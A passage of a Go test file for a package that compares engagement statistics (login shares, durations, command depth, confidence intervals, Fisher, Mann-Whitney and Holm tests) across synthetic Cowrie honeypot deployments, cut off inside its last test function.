package engagement

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"math/rand"
	"reflect"
	"strings"
	"testing"
	"time"
)

// visit is one Cowrie session of a synthetic deployment.
type visit struct {
	src, sid string
	start    float64 // seconds after t0
	login    bool
	cmds     int
	payload  bool
	seconds  float64 // the length the honeypot states
}

func (v visit) events() []Event {
	ev := []Event{at(v.start, v.src, v.sid, "cowrie.session.connect")}
	if v.login {
		ev = append(ev, login(v.start+1, v.src, v.sid, "root", "root"))
	}
	for i := 0; i < v.cmds; i++ {
		ev = append(ev, cmd(v.start+2+float64(i)/100, v.src, v.sid, fmt.Sprint("tool", i)))
	}
	if v.payload {
		ev = append(ev, at(v.start+3, v.src, v.sid, "cowrie.session.file_download"))
	}
	closed := at(v.start+4, v.src, v.sid, "cowrie.session.closed")
	closed.ReportedDuration = time.Duration(v.seconds * float64(time.Second))
	return append(ev, closed)
}

// deployment computes the report of a set of visits.
func deployment(t *testing.T, label string, opt Options, visits []visit) *Report {
	t.Helper()
	var events []Event
	for _, v := range visits {
		events = append(events, v.events()...)
	}
	r := compute(t, opt, events...)
	r.Label = label
	return r
}

// crowd returns n visits from n different public addresses, one a minute.
// The first logins of them log in, the first runners of those run cmds
// commands, and each lasts seconds.
func crowd(prefix string, n, logins, runners, cmds int, seconds float64) []visit {
	out := make([]visit, 0, n)
	for i := 0; i < n; i++ {
		v := visit{
			src: fmt.Sprintf("198.51.%d.%d", i/250, 1+i%250), sid: fmt.Sprint(prefix, i),
			start: float64(i * 60), login: i < logins, seconds: seconds,
		}
		if i < runners {
			v.cmds = cmds
		}
		out = append(out, v)
	}
	return out
}

func deltaOf(t *testing.T, c Comparison, key string) Delta {
	t.Helper()
	for _, d := range c.Deltas {
		if d.Key == key {
			return d
		}
	}
	t.Fatalf("the comparison has no row %q", key)
	return Delta{}
}

func TestIntervalsOfAReport(t *testing.T) {
	// Ten sessions of 1..10 s; the first four log in.
	var visits []visit
	for i := 1; i <= 10; i++ {
		visits = append(visits, visit{src: fmt.Sprintf("198.51.100.%d", i), sid: fmt.Sprint("s", i), start: float64(i * 100), login: i <= 4, seconds: float64(i)})
	}
	r := deployment(t, "x", Options{}, visits)
	want := []Interval{
		// Wilson for 4 of 10: centre (0.4 + 1.9207/10) / 1.38415 = 0.42775,
		// half-width 1.96 * sqrt(0.024 + 0.0096036) / 1.38415 = 0.25957.
		{Key: "login_attempted_pct", Low: 16.82, High: 68.73, N: 10, Method: MethodWilson},
		{Key: "logged_in_pct", Low: 16.82, High: 68.73, N: 10, Method: MethodWilson},
		// Wilson for 0 of 10: 0 to z^2 / (n + z^2) = 3.8415 / 13.8415.
		{Key: "interactive_pct", Low: 0, High: 27.75, N: 10, Method: MethodWilson},
		{Key: "payload_pct", Low: 0, High: 27.75, N: 10, Method: MethodWilson},
		// The 2nd and the 9th of ten values. Four logged-in sessions are too
		// few for an interval, and there are no interactive sessions.
		{Key: "duration_all_median_s", Low: 2, High: 9, N: 10, Method: MethodOrderStatistics},
	}
	if !reflect.DeepEqual(r.Overall.Intervals, want) {
		t.Errorf("intervals:\n got %+v\nwant %+v", r.Overall.Intervals, want)
	}
	if !reflect.DeepEqual(r.Honeypots[0].Intervals, want) {
		t.Errorf("the only honeypot must have the same intervals: %+v", r.Honeypots[0].Intervals)
	}
	for _, iv := range r.Overall.Intervals {
		if got := r.Overall.interval(iv.Key); got == nil || *got != iv {
			t.Errorf("interval(%q) = %+v", iv.Key, got)
		}
	}
	if r.Overall.interval("sessions") != nil {
		t.Error("a count has no interval")
	}
	if got := compute(t, Options{}).Overall.Intervals; got != nil {
		t.Errorf("an empty report has intervals: %+v", got)
	}
}

// TestCompareSharesKnownAnswer runs Newcombe's worked example (56 of 70
// against 48 of 80, Statistics in Medicine 17 (1998) 873-890, table II)
// through whole reports: A has 48 logins in 80 sessions, B 56 in 70.
func TestCompareSharesKnownAnswer(t *testing.T) {
	a := deployment(t, "a", Options{}, crowd("a", 80, 48, 0, 0, 5))
	b := deployment(t, "b", Options{}, crowd("b", 70, 56, 0, 0, 5))
	d := deltaOf(t, Compare(*a, *b), "logged_in_pct")
	if d.A != 60 || d.B != 80 || d.Difference != 20 || d.AN != 80 || d.BN != 70 {
		t.Fatalf("row = %+v", d)
	}
	if d.DifferenceInterval == nil || *d.DifferenceInterval != (Range{Low: 5.24, High: 33.39}) {
		t.Errorf("difference interval = %+v, published 5.24 to 33.39", d.DifferenceInterval)
	}
	// Wilson by hand. 48 of 80: centre (0.6 + 1.9207/80) / 1.048018 =
	// 0.595418, half-width 1.96 * sqrt(0.003 + 0.00015006) / 1.048018 =
	// 0.104965. 56 of 70: centre (0.8 + 1.9207/70) / 1.054878 = 0.784393,
	// half-width 1.96 * sqrt(0.0022857 + 0.000196) / 1.054878 = 0.092561.
	if d.AInterval == nil || !near(d.AInterval.Low, 49.05, 0.006) || !near(d.AInterval.High, 70.04, 0.006) ||
		d.BInterval == nil || !near(d.BInterval.Low, 69.18, 0.006) || !near(d.BInterval.High, 87.70, 0.006) {
		t.Errorf("intervals = %+v and %+v", d.AInterval, d.BInterval)
	}
	want := fisherByEnumeration(48, 80, 56, 70)
	if d.Test != TestFisher || d.PValue == nil || !near(*d.PValue, want, 1e-12) {
		t.Errorf("test = %q, p = %v, want Fisher's %v", d.Test, d.PValue, want)
	}
	// The pooled z test of the same table gives z = 0.2 / 0.07547 = 2.65,
	// p = 0.008. The exact test is a little more cautious.
	if want < 0.008 || want > 0.02 {
		t.Errorf("Fisher's p for the example = %v, expected a little above 0.008", want)
	}
}

func TestCompareVerdicts(t *testing.T) {
	// A: 200 sessions of 20 s, 120 log in, 90 of those run 5 commands.
	// B: 200 sessions of 10 s, 60 log in, 30 of those run 2 commands.
	a := deployment(t, "a", Options{}, crowd("a", 200, 120, 90, 5, 20))
	b := deployment(t, "b", Options{}, crowd("b", 200, 60, 30, 2, 10))
	c := Compare(*a, *b)
	if c.TestedRows != 9 {
		t.Fatalf("tested rows = %d, want 9", c.TestedRows)
	}
	wantVerdict := map[string]string{
		"logged_in_pct":               VerdictClear,
		"interactive_pct":             VerdictClear,
		"payload_pct":                 VerdictNone, // none on either side
		"duration_logged_in_median_s": VerdictClear,
		"duration_all_median_s":       VerdictClear,
		"depth_median":                VerdictClear,
		"distinct_per_session_median": VerdictClear,
		"left_after_probe_pct":        VerdictNone, // none on either side
		"returning_sources_pct":       VerdictNone, // nobody came back
	}
	var raw []float64
	var rows []Delta
	for _, d := range c.Deltas {
		want, tested := wantVerdict[d.Key]
		if !tested {
			if d.Verdict != "" || d.PValue != nil || d.PAdjusted != nil || d.Test != "" {
				t.Errorf("%s is not a tested row: %+v", d.Key, d)
			}
			continue
		}
		if d.Verdict != want || d.PValue == nil || d.PAdjusted == nil || d.Test == "" {
			t.Errorf("%s: verdict %q (p %v), want %q", d.Key, d.Verdict, d.PValue, want)
			continue
		}
		raw, rows = append(raw, *d.PValue), append(rows, d)
	}
	// The adjusted values are Holm's over exactly the tested rows, and the
	// verdict is the adjusted value against 5%.
	for i, adj := range holm(raw) {
		d := rows[i]
		if *d.PAdjusted != adj || (d.Verdict == VerdictClear) != (adj <= 0.05) {
			t.Errorf("%s: adjusted p = %v, Holm gives %v; verdict %q", d.Key, *d.PAdjusted, adj, d.Verdict)
		}
	}
	// The rank test saw every session of each side: B is never longer.
	d := deltaOf(t, c, "duration_all_median_s")
	if d.Test != TestMannWhitney || d.ASample != 200 || d.BSample != 200 || d.BLarger == nil || *d.BLarger != 0 {
		t.Errorf("duration row = %+v", d)
	}
	// A row without a direction gets intervals and no test.
	d = deltaOf(t, c, "login_attempted_pct")
	if d.AInterval == nil || d.BInterval == nil || d.DifferenceInterval == nil || d.Verdict != "" || d.PValue != nil {
		t.Errorf("attempted-login row = %+v", d)
	}
	// A row that is neither a share nor a median has none of it.
	d = deltaOf(t, c, "duration_all_p90_s")
	if d.AInterval != nil || d.DifferenceInterval != nil || d.Verdict != "" || d.AN != 0 {
		t.Errorf("p90 row = %+v", d)
	}
	if !c.Exposure.Comparable || len(c.Notes) != 0 {
		t.Errorf("exposure = %+v, notes = %q", c.Exposure, c.Notes)
	}
}

func TestCompareTooFew(t *testing.T) {
	big := deployment(t, "big", Options{}, crowd("a", 200, 120, 90, 5, 20))
	for _, n := range []int{MinCompare - 1, MinCompare} {
		small := deployment(t, "small", Options{}, crowd("b", n, n, n, 2, 10))
		for _, c := range []Comparison{Compare(*big, *small), Compare(*small, *big)} {
			for _, d := range c.Deltas {
				rt, ok := rowTests[d.Key]
				if !ok || !rt.verdict {
					continue
				}
				// Every visit of the small side logs in and runs a command,
				// so each base is n, except the sources: all distinct too.
				if n < MinCompare {
					if d.Verdict != VerdictTooFew || d.PValue != nil || d.PAdjusted != nil || d.Test != "" {
						t.Errorf("%d sessions, %s: %+v, want %q and no test", n, d.Key, d, VerdictTooFew)
					}
				} else if d.Verdict == VerdictTooFew || d.PValue == nil {
					t.Errorf("%d sessions, %s: %+v, want a test", n, d.Key, d)
				}
			}
			if want := map[bool]int{true: 0, false: 9}[n < MinCompare]; c.TestedRows != want {
				t.Errorf("%d sessions: %d tested rows, want %d", n, c.TestedRows, want)
			}
		}
	}
	// A side with nothing at all: every tested row is too few, no panic.
	empty := compute(t, Options{})
	empty.Label = "empty"
	c := Compare(*big, *empty)
	for _, d := range c.Deltas {
		if rt, ok := rowTests[d.Key]; ok && rt.verdict && d.Verdict != VerdictTooFew {
			t.Errorf("against an empty report, %s: %+v", d.Key, d)
		}
	}
	if c.Exposure.Comparable || len(c.Exposure.Problems) != 1 || !strings.Contains(c.Exposure.Problems[0], "empty has no sessions") {
		t.Errorf("exposure against an empty report = %+v", c.Exposure)
	}
}

// addressPool holds public IPv4 addresses, IPv6 addresses of which some share
// a /64, and a few addresses that never name a visitor.
func addressPool() []string {
	pool := []string{"10.1.2.3", "192.168.7.7", "127.0.0.1", "fe80::1", "not-an-address"}
	for i := 1; i <= 60; i++ {
		pool = append(pool, fmt.Sprintf("203.0.113.%d", i))
	}
	for i := 0; i < 12; i++ {
		pool = append(pool, fmt.Sprintf("2001:db8:0:%x::%x", i/2, i+1))
	}
	return pool
}

// randomArm is a random stream whose sessions come from the pool: each
// session id keeps one address, and events without an id pick any.
func randomArm(seed int64, n, shift int) []Event {
	rng := rand.New(rand.NewSource(seed))
	pool := addressPool()
	events := randomEvents(rng, n)
	for i := range events {
		e := &events[i]
		if e.SessionID == "" {
			e.SourceIP = pool[rng.Intn(len(pool))]
			continue
		}
		var id int
		_, _ = fmt.Sscanf(e.SessionID, "sid%d", &id)
		e.SessionID = fmt.Sprint(e.SessionID, "-", seed)
		e.SourceIP = pool[(id*7+shift)%len(pool)]
	}
	return events
}

func TestCompareIdenticalArms(t *testing.T) {
	events := randomArm(1, 4000, 0)
	a := compute(t, Options{}, events...)
	b := compute(t, Options{}, events...)
	a.Label, b.Label = "one", "two"
	c := Compare(*a, *b)
	if c.TestedRows != 9 {
		t.Fatalf("tested rows = %d, want 9: the stream is too small", c.TestedRows)
	}
	for _, d := range c.Deltas {
		if d.Defined && d.Difference != 0 {
			t.Errorf("%s differs between identical reports: %+v", d.Key, d)
		}
		if d.PValue == nil {
			continue
		}
		if *d.PValue != 1 || *d.PAdjusted != 1 || d.Verdict != VerdictNone {
			t.Errorf("%s of identical reports: p = %v, adjusted %v, %q", d.Key, *d.PValue, *d.PAdjusted, d.Verdict)
		}
		if d.BLarger != nil && *d.BLarger != 0.5 {
			t.Errorf("%s of identical reports: B larger in %v of pairs", d.Key, *d.BLarger)
		}
		if d.DifferenceInterval != nil && (d.DifferenceInterval.Low != -d.DifferenceInterval.High || d.DifferenceInterval.Low > 0) {
			t.Errorf("%s of identical reports: interval %+v is not centred on zero", d.Key, *d.DifferenceInterval)
		}
	}
	e := c.Exposure
	if !e.Comparable || e.SessionRatio != 1 || e.SourceRatio != 1 || e.OverlapPercent != 100 || e.Jaccard != 1 ||
		e.SharedSources != a.Sources.Public || e.SharedSources == 0 {
		t.Errorf("exposure of identical reports = %+v", e)
	}
	p := c.Paired
	if p.Skipped || p.Shared != a.Sources.Public || len(p.Measures) != len(pairedDefs) {
		t.Fatalf("shared sources of identical reports = %+v", p)
	}
	for _, m := range p.Measures {
		if m.AFurther != 0 || m.BFurther != 0 || m.Tied != p.Shared || m.PValue != 1 || m.PAdjusted != 1 || m.Verdict != VerdictNone {
			t.Errorf("measure of identical reports = %+v", m)
		}
	}
}

func TestCompareSymmetry(t *testing.T) {
	limits := map[string]Options{
		"default limits": {},
		"limits reached": {SampleLimit: 40, SourceLimit: 25},
	}
	for name, opt := range limits {
		t.Run(name, func(t *testing.T) {
			a := compute(t, opt, randomArm(1, 4000, 0)...)
			b := compute(t, opt, randomArm(2, 2500, 11)...)
			a.Label, b.Label = "one", "two"
			ab, ba := Compare(*a, *b), Compare(*b, *a)
			if ab.TestedRows != 9 || ba.TestedRows != 9 {
				t.Fatalf("tested rows = %d and %d, want 9", ab.TestedRows, ba.TestedRows)
			}
			if name == "limits reached" != (a.Limits.SampleReached && a.Limits.PairedSourcesReached && b.Limits.PairedSourcesReached) {
				t.Fatalf("limits = %+v", a.Limits)
			}
			flip := map[string]string{"a": "b", "b": "a", "equal": "equal", "": ""}
			clear := 0
			for i, x := range ab.Deltas {
				y := ba.Deltas[i]
				if x.A != y.B || x.B != y.A || x.Difference != -y.Difference || x.Favours != flip[y.Favours] || x.Defined != y.Defined {
					t.Errorf("%s: %+v against %+v", x.Key, x, y)
				}
				if !reflect.DeepEqual(x.AInterval, y.BInterval) || !reflect.DeepEqual(x.BInterval, y.AInterval) || x.AN != y.BN || x.ASample != y.BSample {
					t.Errorf("%s: the sides are not swapped: %+v against %+v", x.Key, x, y)
				}
				if (x.DifferenceInterval == nil) != (y.DifferenceInterval == nil) ||
					(x.DifferenceInterval != nil && (x.DifferenceInterval.Low != -y.DifferenceInterval.High || x.DifferenceInterval.High != -y.DifferenceInterval.Low)) {
					t.Errorf("%s: interval %+v is not the mirror of %+v", x.Key, x.DifferenceInterval, y.DifferenceInterval)
				}
				if x.Verdict != y.Verdict || x.Test != y.Test || (x.PValue == nil) != (y.PValue == nil) {
					t.Errorf("%s: verdict %q against %q", x.Key, x.Verdict, y.Verdict)
				}
				if x.PValue != nil && (*x.PValue != *y.PValue || *x.PAdjusted != *y.PAdjusted) {
					t.Errorf("%s: p = %v (adjusted %v) one way, %v (adjusted %v) the other", x.Key, *x.PValue, *x.PAdjusted, *y.PValue, *y.PAdjusted)
				}
				if x.BLarger != nil && !near(*x.BLarger+*y.BLarger, 1, 0.00011) {
					t.Errorf("%s: B larger in %v of pairs one way and %v the other", x.Key, *x.BLarger, *y.BLarger)
				}
				if x.Verdict == VerdictClear {
					clear++
				}
			}
			if clear == 0 && name == "default limits" {
				t.Errorf("the two streams show no clear difference: the test exercises nothing")
			}
			ex, ey := ab.Exposure, ba.Exposure
			if ex.A != ey.B || ex.B != ey.A || ex.SessionRatio != ey.SessionRatio || ex.SourceRatio != ey.SourceRatio ||
				ex.OverlapSeconds != ey.OverlapSeconds || ex.OverlapPercent != ey.OverlapPercent || ex.SharedSources != ey.SharedSources ||
				ex.Jaccard != ey.Jaccard || ex.ComparedA != ey.ComparedB || ex.ComparedB != ey.ComparedA || ex.Comparable != ey.Comparable ||
				ex.SourcesSampled != ey.SourcesSampled {
				t.Errorf("exposure:\n one way   %+v\n the other %+v", ex, ey)
			}
			px, py := ab.Paired, ba.Paired
			if px.Skipped || py.Skipped || px.Shared != py.Shared || px.Shared == 0 || px.Sampled != py.Sampled || px.Sampled != (name == "limits reached") {
				t.Fatalf("shared sources:\n one way   %+v\n the other %+v", px, py)
			}
			moved := int64(0)
			for i, x := range px.Measures {
				y := py.Measures[i]
				if x.AFurther != y.BFurther || x.BFurther != y.AFurther || x.Tied != y.Tied || x.PValue != y.PValue || x.PAdjusted != y.PAdjusted || x.Verdict != y.Verdict {
					t.Errorf("measure %s: %+v against %+v", x.Key, x, y)
				}
				if x.AFurther+x.BFurther+x.Tied != px.Shared {
					t.Errorf("measure %s does not cover the %d shared sources: %+v", x.Key, px.Shared, x)
				}
				moved += x.AFurther + x.BFurther
			}
			if moved == 0 {
				t.Errorf("no shared source went further on either side: the test exercises nothing")
			}
		})
	}
}

func TestCompareDoesNotDependOnEventOrder(t *testing.T) {
	limits := map[string]Options{
		"default limits": {},
		"limits reached": {SampleLimit: 40, SourceLimit: 25, SessionLimit: 600},
	}
	for name, opt := range limits {
		t.Run(name, func(t *testing.T) {
			ea, eb := randomArm(1, 4000, 0), randomArm(2, 2500, 11)
			render := func() (string, string) {
				a, b := compute(t, opt, ea...), compute(t, opt, eb...)
				a.Label, b.Label = "one", "two"
				js, err := json.Marshal(Compare(*a, *b))
				if err != nil {
					t.Fatal(err)
				}
				var text bytes.Buffer
				if err := WriteText(&text, []*Report{a, b}); err != nil {
					t.Fatal(err)
				}
				return string(js), text.String()
			}
			wantJSON, wantText := render()
			if name == "limits reached" {
				for _, note := range []string{"rank tests use a fixed sample", "same fixed part of the address space"} {
					if !strings.Contains(wantJSON, note) {
						t.Fatalf("the limits were not reached: %q is missing from %s", note, wantJSON)
					}
				}
			}
			rng := rand.New(rand.NewSource(77))
			for round := 0; round < 8; round++ {
				rng.Shuffle(len(ea), func(i, j int) { ea[i], ea[j] = ea[j], ea[i] })
				rng.Shuffle(len(eb), func(i, j int) { eb[i], eb[j] = eb[j], eb[i] })
				gotJSON, gotText := render()
				if gotJSON != wantJSON {
					t.Fatalf("round %d: the comparison changed with the order of events\nfirst: %s\nthen:  %s", round, wantJSON, gotJSON)
				}
				if gotText != wantText {
					t.Fatalf("round %d: the text changed with the order of events\nfirst:\n%s\nthen:\n%s", round, wantText, gotText)
				}
			}
		})
	}
}

func TestRankTestSample(t *testing.T) {
	const limit, sessions = 50, 400
	build := func(length func(i int) float64) *Report {
		var visits []visit
		for i := 0; i < sessions; i++ {
			visits = append(visits, visit{
				src: fmt.Sprintf("198.51.%d.%d", i/250, 1+i%250), sid: fmt.Sprint("s", i),
				start: float64(i * 60), login: i%2 == 0, cmds: 1 + i%3, seconds: length(i),
			})
		}
		return deployment(t, "sampled", Options{SampleLimit: limit}, visits)
	}
	// Session i lasts i+1 seconds in one report and 1000-i in the other, so
	// a kept length names the session it belongs to.
	up := build(func(i int) float64 { return float64(i + 1) })
	down := build(func(i int) float64 { return float64(1000 - i) })
	if !up.Limits.SampleReached || up.Limits.Sample != limit || len(up.detail.durAll) != limit || len(up.detail.durLoggedIn) != limit || len(up.detail.depth) != limit {
		t.Fatalf("limits = %+v, sample of %d", up.Limits, len(up.detail.durAll))
	}
	if len(up.Notes) != 1 || !strings.Contains(up.Notes[0], "fixed sample of 50 sessions") {
		t.Errorf("notes = %q", up.Notes)
	}
	kept := func(r *Report, index func(us int64) int) map[int]bool {
		out := map[int]bool{}
		for _, us := range r.detail.durAll {
			out[index(us)] = true
		}
		return out
	}
	first := kept(up, func(us int64) int { return int(us/1e6) - 1 })
	second := kept(down, func(us int64) int { return 1000 - int(us/1e6) })
	if len(first) != limit || !reflect.DeepEqual(first, second) {
		t.Errorf("the sessions kept depend on their length:\n%v\n%v", first, second)
	}
	// The sample is spread over the sessions, not the first or the last 50.
	low, high := 0, 0
	for i := range first {
		if i < sessions/2 {
			low++
		} else {
			high++
		}
	}
	if low < 10 || high < 10 {
		t.Errorf("the sample is lopsided: %d from the first half, %d from the second", low, high)
	}
	// The medians and their intervals still cover every session.
	if up.Overall.Duration.All.Sessions != sessions || up.Overall.interval("duration_all_median_s").N != sessions {
		t.Errorf("the median covers %d sessions, want %d", up.Overall.interval("duration_all_median_s").N, sessions)
	}

	c := Compare(*up, *down)
	d := deltaOf(t, c, "duration_all_median_s")
	if d.AN != sessions || d.BN != sessions || d.ASample != limit || d.BSample != limit || d.Verdict != VerdictClear {
		t.Errorf("duration row = %+v", d)
	}
	if len(c.Notes) != 2 || !strings.Contains(c.Notes[0], "sampled has more than 50 sessions") {
		t.Errorf("comparison notes = %q", c.Notes)
	}
	// Exactly the limit is not "more than the limit".
	exact := deployment(t, "exact", Options{SampleLimit: limit}, crowd("e", limit, limit, limit, 2, 5))
	if exact.Limits.SampleReached || len(exact.Notes) != 0 || len(exact.detail.durAll) != limit {
		t.Errorf("exactly the limit: %+v, notes %q", exact.Limits, exact.Notes)
	}
}

func TestExposureCheck(t *testing.T) {
	// span gives n sessions spread evenly from start to end seconds.
	span := func(prefix string, n int, start, end float64) []visit {
		var out []visit
		for i := 0; i < n; i++ {
			at := start + (end-start-4)*float64(i)/float64(n-1)
			out = append(out, visit{src: fmt.Sprintf("198.51.%d.%d", i/250, 1+i%250), sid: fmt.Sprint(prefix, i), start: at, seconds: 1})
		}
		return out
	}
	cases := []struct {
		name       string
		a, b       []visit
		comparable bool
		ratio      float64
		overlap    float64
		problem    string
	}{
		{"same exposure", span("a", 100, 0, 1000), span("b", 100, 0, 1000), true, 1, 100, ""},
		{"three times the sessions is the limit", span("a", 100, 0, 1000), span("b", 300, 0, 1000), true, 3, 100, ""},
		{"more than three times", span("a", 100, 0, 1000), span("b", 301, 0, 1000), false, 3.01, 100, "b has 3.0 times the sessions of a (limit 3)."},
		{"the larger side first", span("a", 400, 0, 1000), span("b", 100, 0, 1000), false, 4, 100, "a has 4.0 times the sessions of b (limit 3)."},
		{"80% of the period in common is the limit", span("a", 100, 0, 1000), span("b", 100, 200, 1000), true, 1, 80, ""},
		{"less than 80% in common", span("a", 100, 0, 1000), span("b", 100, 210, 1000), false, 1, 79, "The two periods share 79.0% of the combined period (at least 80% is needed)."},
		{"periods that do not meet", span("a", 100, 0, 1000), span("b", 100, 2000, 3000), false, 1, 0, "The two periods share 0.0% of the combined period (at least 80% is needed)."},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			a, b := deployment(t, "a", Options{}, tc.a), deployment(t, "b", Options{}, tc.b)
			c := Compare(*a, *b)
			e := c.Exposure
			if e.Comparable != tc.comparable || e.SessionRatio != tc.ratio || e.OverlapPercent != tc.overlap {
				t.Errorf("exposure = %+v, want comparable %v, ratio %v, overlap %v%%", e, tc.comparable, tc.ratio, tc.overlap)
			}
			var problems []string
			if tc.problem != "" {
				problems = []string{tc.problem}
			}
			if !reflect.DeepEqual(e.Problems, problems) {
				t.Errorf("problems = %q, want %q", e.Problems, problems)
			}
			if failed := len(c.Notes) > 0 && strings.Contains(c.Notes[0], "The exposure check failed"); failed == tc.comparable {
				t.Errorf("notes = %q with comparable = %v", c.Notes, tc.comparable)
			}
			if e.A.Label != "a" || e.A.Sessions != int64(len(tc.a)) || e.B.Sessions != int64(len(tc.b)) || e.A.Sources != a.Sources.Sources || e.B.PublicSources != b.Sources.Public {
				t.Errorf("sides = %+v and %+v", e.A, e.B)
			}
			if !e.A.First.Equal(a.Window.First) || !e.B.Last.Equal(b.Window.Last) || e.A.PeriodSeconds != 1000 {
				t.Errorf("periods = %+v and %+v", e.A, e.B)
			}
		})
	}

	// The numbers of one comparison, by hand: A from 0 to 1000 s and B from
	// 210 to 1000 s have 790 of 1000 seconds in common.
	a, b := deployment(t, "a", Options{}, span("a", 100, 0, 1000)), deployment(t, "b", Options{}, span("b", 50, 210, 1000))
	e := Compare(*a, *b).Exposure
	if e.OverlapSeconds != 790 || e.B.PeriodSeconds != 790 || e.SessionRatio != 2 || e.SourceRatio != 2 || e.SharedSources != 50 || e.Jaccard != 0.5 || !e.SourcesKnown || e.SourcesSampled {
		t.Errorf("exposure = %+v", e)
	}
}

func TestWriteTextComparison(t *testing.T) {
	a := deployment(t, "sensor1", Options{}, crowd("a", 200, 120, 90, 5, 20))
	b := deployment(t, "stock", Options{}, crowd("b", 180, 72, 36, 2, 10))
	c := deployment(t, "third", Options{}, crowd("c", 10, 5, 0, 0, 1))
	var two, three, one bytes.Buffer
	if err := WriteText(&two, []*Report{a, b}); err != nil {
		t.Fatal(err)
	}
	if err := WriteText(&three, []*Report{a, b, c}); err != nil {
		t.Fatal(err)
	}
	if err := WriteText(&one, []*Report{a}); err != nil {
		t.Fatal(err)
	}
	text := two.String()
	for _, want := range []string{
		"Exposure check: A = sensor1, B = stock",
		"  Sessions                 200                   180  ratio 1.11",
		"Passed: session ratio at most 3, period overlap at least 80%.",
		"Public source addresses seen by both: 180 of the 200 seen by either (Jaccard index 0.9000).",
		"95% INTERVAL                                       SENSOR1        STOCK",
		// Wilson for 120 of 200 and for 72 of 180, and Newcombe's interval
		// for 40% minus 60% from them: -20 - sqrt(6.88^2 + 6.54^2) and
		// -20 + sqrt(7.29^2 + 6.92^2).
		"Logged in                                          53.1 to 66.5%  33.1 to 47.3%",
		"Commands per interactive session: median           5 to 5         2 to 2",
		"Differences, B minus A: A = sensor1, B = stock",
		"METRIC                                             B MINUS A          ADJ. P  VERDICT",
		"Logged in                                          -29.5 to -9.9      <0.001  clear difference",
		"Duration, all sessions: median                     B>A 0.0% of pairs  <0.001  clear difference",
		"Fetched or uploaded a payload                      -1.9 to +2.1       1.000   no clear difference",
		"Holm's correction over the 9 tested rows",
		"Shared sources: A = sensor1, B = stock",
		"180 public source addresses were seen by both.",
		"MEASURE                        A FURTHER  B FURTHER  TIED  P       ADJ. P  VERDICT",
		// Addresses 73 to 120 log in on sensor1 only.
		"Logged in                      48         0          132   <0.001  <0.001  clear difference",
		"Source addresses: 200, of them 200 public; the busiest has 0.5% of the sessions",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("two reports: %q is missing from\n%s", want, text)
		}
	}
	// The exposure check comes before the table, everything else after it.
	order := []string{"Exposure check:", "METRIC ", "95% INTERVAL", "Differences, B minus A", "Shared sources:", "\nsensor1\n"}
	last := -1
	for _, part := range order {
		at := strings.Index(text, part)
		if at <= last {
			t.Errorf("%q is out of place in\n%s", part, text)
		}
		last = at
	}
	// Everything added to the table fits a terminal of 100 columns.
	head, _, _ := strings.Cut(text, "\nsensor1\n")
	for _, line := range strings.Split(head, "\n") {
		if len(line) > 100 || line != strings.TrimRight(line, " ") {
			t.Errorf("line of %d columns, or with spaces at its end: %q", len(line), line)
		}
	}

	// Three reports: the first against each of the others.
	text = three.String()
	for _, want := range []string{
		"Exposure check: A = sensor1, B = stock", "Exposure check: A = sensor1, B = third",
		"NOT COMPARABLE: sensor1 has 20.0 times the sessions of third (limit 3).",
		"The numbers below are still printed.",
		"Differences, B minus A: A = sensor1, B = third",
		"Logged in                                          -37.1 to +17.2  -       too few to compare",
		"Note: The exposure check failed.",
		"SENSOR1        STOCK          THIRD",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("three reports: %q is missing from\n%s", want, text)
		}
	}
	if strings.Count(text, "Shared sources: A = ") != 2 || strings.Count(text, "  BETTER\n") != 1 {
		t.Errorf("three reports must give two comparisons and one table:\n%s", text)
	}

	// One report: its intervals, and no comparison.
	text = one.String()
	if !strings.Contains(text, "95% INTERVAL") || !strings.Contains(text, "53.1 to 66.5%") {
		t.Errorf("one report must give its intervals:\n%s", text)
	}
	for _, not := range []string{"Exposure check", "B MINUS A", "Shared sources"} {
		if strings.Contains(text, not) {
			t.Errorf("one report has nothing to compare with, but prints %q:\n%s", not, text)
		}
	}
}

func TestWriteWrapped(t *testing.T) {
	var out bytes.Buffer
	writeWrapped(&out, "  ", strings.Repeat("word ", 60)+strings.Repeat("x", 150)+" end")
	lines := strings.Split(strings.TrimRight(out.String(), "\n"), "\n")
	if len(lines) != 6 {
		t.Fatalf("got %d lines:\n%s", len(lines), out.String())
	}
	for i, line := range lines {
		if !strings.HasPrefix(line, "  ") || (len(line) > textWidth && !strings.Contains(line, "xxx")) || line != strings.TrimRight(line, " ") {
			t.Errorf("line %d: %q", i, line)
		}
	}
	if got := strings.Join(strings.Fields(out.String()), " "); got != strings.TrimSpace(strings.Repeat("word ", 60)+strings.Repeat("x", 150)+" end") {
		t.Errorf("words were lost: %q", got)
	}
	out.Reset()
	writeWrapped(&out, "  ", "   ")
	if out.Len() != 0 {
		t.Errorf("blank text printed %q", out.String())
	}
}

// TestCompareReportsReadFromJSON: a report that went through JSON has lost
// its samples and its source table. Its shares are still tested; its medians
// and its shared sources are not, and the comparison says so.
func TestCompareReportsReadFromJSON(t *testing.T) {
	a := deployment(t, "a", Options{}, crowd("a", 200, 120, 90, 5, 20))
	b := deployment(t, "b", Options{}, crowd("b", 200, 60, 30, 2, 10))
	direct := Compare(*a, *b)
	var back [2]Report
	for i, r := range []*Report{a, b} {
		raw, err := json.Marshal(r)
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(string(raw), "detail") || strings.Contains(string(raw), "198.51.") {
			t.Fatalf("the JSON of a report carries samples or addresses: %s", raw)
		}
		if err := json.Unmarshal(raw, &back[i]); err != nil {
			t.Fatal(err)
		}
	}
	c := Compare(back[0], back[1])
	if c.TestedRows != 5 {
		t.Errorf("tested rows = %d, want the 5 shares", c.TestedRows)
	}
	for i, d := range c.Deltas {
		rt, ok := rowTests[d.Key]
		switch {
		case !ok || !rt.verdict:
		case rt.share != nil:
			if d.PValue == nil || *d.PValue != *direct.Deltas[i].PValue || !reflect.DeepEqual(d.DifferenceInterval, direct.Deltas[i].DifferenceInterval) {
				t.Errorf("%s after JSON: %+v", d.Key, d)
			}
		default:
			if d.PValue != nil || d.Verdict != "" || d.Test != "" || !reflect.DeepEqual(d.AInterval, direct.Deltas[i].AInterval) {
				t.Errorf("%s after JSON must keep its interval and have no test: %+v", d.Key, d)
			}
		}
	}
	if c.Exposure.SourcesKnown || c.Exposure.SharedSources != 0 || !c.Paired.Skipped || !strings.Contains(c.Paired.Reason, "no source table") {
		t.Errorf("after JSON: exposure %+v, shared sources %+v", c.Exposure, c.Paired)
	}
